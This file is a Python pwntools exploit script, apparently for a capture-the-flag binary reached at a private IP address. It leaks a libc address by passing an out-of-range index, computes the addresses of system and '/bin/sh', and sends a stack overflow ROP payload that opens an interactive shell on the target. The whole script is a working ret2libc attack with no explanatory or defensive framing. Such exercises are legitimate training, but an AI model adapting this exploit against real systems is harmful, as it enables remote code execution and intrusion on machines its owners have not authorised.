from pwn import *

debug = 1
local = 0
attach = local & 0
bps = attach & 1
proc_name = 'second'
#socat TCP4-LISTEN:10001,fork EXEC:./pwn3
ip = '10.105.42.5' 
port = 2335
io = None

def makeio():
    global io 
    if local:
    	io = process(proc_name)
    else:
    	io = remote(ip,port)
def ru(data):
	return io.recvuntil(data)
def rv():
	return io.recv()
def sl(data):
	return io.sendline(data)
def sn(data):
	return io.send(data)
def rl():
	return io.recvline()

def pwn():
	makeio()
	if debug:
		context.log_level = 'debug'
	if attach:
		if bps:
			gdb.attach(pidof(proc_name)[0], open('bps'))
		else:
			gdb.attach(pidof(proc_name)[0])


	#printf_got = 0x4005f0  # 4195824
	libc = ELF('libc-64.so')
	#libc = ELF('thislib.so')

	system_offset = libc.symbols['system']
	
	binsh_offset = next(libc.search('/bin/sh\x00'))#0x11e70 #

	# libc64 0x11c30


	# system_addr  = printf_addr - printf_offset + system_offset
	ru("number:")
	sl("1")
	ru("number:")
	sl("2")
	ru("number:")
	sl("3")
	ru("number:")
	sl("4")
	ru("number:")
	sl("5")
	ru("number:")
	sl("6")
	ru("number:")
	sl("7")
	ru("number:")
	sl("8")
	ru("see?")
	sl("4294967295") # signed 0 
	ru("seek:")
	sl("12")   #  =  libc_addr + 240 
	rl()

	content = rl()
	print content
	addr = content.split('=')[1]
	print addr
	lib_addr =  int(addr) - 245
	#lib_addr -= 0x20740  #
	lib_addr -= 0x21e50


	print hex(int(addr) - 245)  ##!!!!! ATTENTION!!
	#print addr

	print "system_offset" +  hex(system_offset)
	system_addr = lib_addr + system_offset

	print "system_addr " + hex(system_addr)
	print "binsh_offset" + hex(binsh_offset)

	binsh_addr =  lib_addr + binsh_offset
	print "binsh_addr" + hex(binsh_addr)



	ru("name:")
	#local
	pop_ret_addr = lib_addr + 0x0000000000022b9a

	#payload = 0x18*'A' + p64(system_addr) + p64(0xdeadbeaf) + p64(binsh_addr)
	
	payload = "A"*0x18 + p64(pop_ret_addr) + p64(binsh_addr) + p64(system_addr)

	sl(payload)
	io.interactive()

	#printf got 0x601028
	#number buffer  
	#0x7ffe39df9708 --> 0x7f06ddd2f830 (<__libc_start_main+240>
	#0x7ffe39df96b0  number buffer
	# number buffesr + 0x58   = content
	# content -240   = libc addr  

if __name__ == '__main__':
	pwn()

